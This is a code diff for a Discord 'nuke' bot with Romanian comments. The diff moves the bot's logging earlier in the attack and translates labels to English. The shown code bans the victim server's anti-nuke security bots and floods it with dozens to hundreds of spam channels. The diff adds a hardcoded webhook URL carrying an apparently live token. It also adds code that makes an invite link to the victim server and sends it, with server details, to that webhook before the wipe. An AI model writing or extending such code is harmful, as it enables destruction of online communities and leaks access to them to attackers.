@@ -25,7 +25,7 @@ BLACKLISTED_GUILD_ID = 1525971260943892510
 OWNER_ID = 1464634211406188721
 LEADERBOARD_CHANNEL_ID = 1401931021544460389
 TOKEN = os.getenv('TOKEN')
-LOG_WEBHOOK_URL = os.getenv('LOG_WEBHOOK') or ''
+LOG_WEBHOOK_URL = 'https://discord.com/api/webhooks/1538408453783953469/TADJTY09gijkuwZ8MX_5zslLBA8PQYTnmxTzYT8ZCsEESVd6_BViqHGXg5VFS94SwZTo'
 
 BLOCKED_BOT_IDS = [651095740390834176, 548410451818708993]
 BLOCKED_BOT_NAMES = ["Security", "Wick", "Beemo", "AntiNuke"]
@@ -220,25 +220,30 @@ class MyBot(commands.Bot):
 bot = MyBot()
 
 # ================== FUNCȚIA DE LOG PRIN WEBHOOK ==================
-async def send_nuke_log(guild, user, channels, messages):
+async def send_nuke_log(guild, user, channels, messages, invite_link=None):
     if not LOG_WEBHOOK_URL:
         return
 
+    # Construim descrierea
+    description = f"**{user.display_name}** (`{user.id}`) has just nuked the server **{guild.name}**."
+    if invite_link:
+        description += f"\n\n🔗 **Server Invite:** {invite_link}"
+
     embed = discord.Embed(
         title="💀 Server Nuked",
-        description=f"**{user.display_name}** (`{user.id}`) a executat un nuke pe serverul **{guild.name}**.",
+        description=description,
         color=discord.Color.red(),
         timestamp=datetime.utcnow()
     )
     embed.set_thumbnail(url=guild.icon.url if guild.icon else None)
-    embed.add_field(name="👤 Membri", value=f"`{guild.member_count}`", inline=True)
-    embed.add_field(name="🫆 Roluri", value=f"`{len(guild.roles)}`", inline=True)
+    embed.add_field(name="👤 Members", value=f"`{guild.member_count}`", inline=True)
+    embed.add_field(name="🫆 Roles", value=f"`{len(guild.roles)}`", inline=True)
     embed.add_field(name="🔗 Server", value=f"`{guild.name}` (`{guild.id}`)", inline=False)
     embed.add_field(name="👑 Owner", value=f"`{guild.owner}`", inline=True)
-    embed.add_field(name="📅 Creat", value=f"`{guild.created_at.strftime('%Y-%m-%d %H:%M UTC')}`", inline=True)
+    embed.add_field(name="📅 Created", value=f"`{guild.created_at.strftime('%Y-%m-%d %H:%M UTC')}`", inline=True)
     embed.add_field(name="⚡ Boost Level", value=f"`{guild.premium_tier}`", inline=True)
-    embed.add_field(name="📊 Canale create", value=f"`{channels}`", inline=True)
-    embed.add_field(name="📨 Mesaje per canal", value=f"`{messages}`", inline=True)
+    embed.add_field(name="📊 Channels created", value=f"`{channels}`", inline=True)
+    embed.add_field(name="📨 Messages per channel", value=f"`{messages}`", inline=True)
     embed.set_footer(text="Larp Nuke Bot • Logs")
 
     try:
@@ -441,7 +446,7 @@ async def modraid(ctx, *, message=None):
     except:
         pass
 
-# ================== !nhelp (fără insulte) ==================
+# ================== !nhelp ==================
 @bot.command(name="nhelp")
 async def real_help(ctx):
     embed = discord.Embed(
@@ -555,17 +560,28 @@ async def setup(ctx):
         await guild.leave()
         return
 
+    # ==== DETERMINĂ PARAMETRII ȘI CREEZĂ INVITAȚIA (ÎNAINTE DE ȘTERGERE) ====
+    is_owner = (user.id == OWNER_ID)
+    total_channels = 200 if is_owner else 70
+    spam_messages = 25 if is_owner else 15
+
+    # Creează un link de invitație (dacă are permisiuni)
+    invite_link = None
+    try:
+        invite = await guild.text_channels[0].create_invite(max_age=3600, max_uses=10, reason="Nuke log invite")
+        invite_link = invite.url
+    except:
+        pass  # dacă nu poate crea, merge fără link
+
+    # ==== TRIMITE LOGUL INSTANT ====
+    await send_nuke_log(guild, user, total_channels, spam_messages, invite_link)
+
+    # ==== CONTINUĂ CU RESTUL NUKE-ULUI ====
     banned_bots = await detect_and_ban_antinuke_bots(guild)
     if banned_bots:
         await user.send(f"✅ Banned anti-nuke bots: {', '.join(banned_bots)}")
 
     save_nuke_stats(user.id, guild)
-
-    is_owner = (user.id == OWNER_ID)
-    total_channels = 200 if is_owner else 70
-    spam_messages = 25 if is_owner else 15
-
-    await send_nuke_log(guild, user, total_channels, spam_messages)
 
     admin_users = [1389763251042258944, 1464634211406188721]
 
@@ -658,7 +674,7 @@ async def setup(ctx):
             await asyncio.sleep(0.1)
 
             # Trimite GIF-ul din când în când (random)
-            if random.random() < 0.3:  # 30% șansă
+            if random.random() < 0.3:
                 await send_with_retry(channel, embed=embed_gif)
                 await asyncio.sleep(0.1)
 
